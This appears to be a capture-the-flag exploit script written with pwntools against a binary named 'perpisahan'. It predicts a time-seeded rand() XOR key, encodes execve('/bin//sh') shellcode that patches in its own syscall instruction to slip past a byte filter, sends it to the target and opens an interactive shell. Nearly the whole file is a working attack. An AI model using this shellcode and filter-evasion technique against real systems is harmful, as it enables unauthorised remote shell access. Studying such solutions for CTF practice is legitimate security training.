#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

exe = ELF("./perpisahan_patched")
libc = CDLL('libc.so.6')
ld = ELF("./ld-linux-x86-64.so.2")
libc2 = ELF('./libc.so.6')
context.binary = exe

# def xor_shellcode(shellcode):
#     pass



def prng(message):
    # Get the seed from libc.time(0)
    seed = libc.time(0)
    libc.srand(seed)  # Initialize the RNG with the seed
    key = (libc.rand() * 7 + 5) # Generate the key (0-255)

    print(f"My Key : {key}")  # Output the key
    
    # Ensure message is bytes
    if isinstance(message, str):
        message = message.encode()

    print(f"the normal text {message}")  # Log the original message

    # Encrypt the message by XORing each byte with the key
    encrypted = xor(message,key)

    print(f"The encrypted : {encrypted}")  # Log the encrypted message
    return encrypted

def conn():
    if args.LOCAL:
        r = process([exe.path])
        sleep(15)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    
    # good luck pwning :)
    shellcode = b"\xeb\x1a\x5e\x48\x31\xc0\x80\x3e\xca\x75\x05\xc6\x06\x0f\xc6\x46\x01\x05\xeb\x0f\xe8\xe1\xff\xff\xff\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\xca\x7d"
    enc = prng(shellcode)
    r.sendlineafter(b"apa yang ingin anda sampaikan sebelum kita berpisah?",enc)
    write("p",enc)
    r.interactive()
    # r.interactive()


if __name__ == "__main__":
    main()
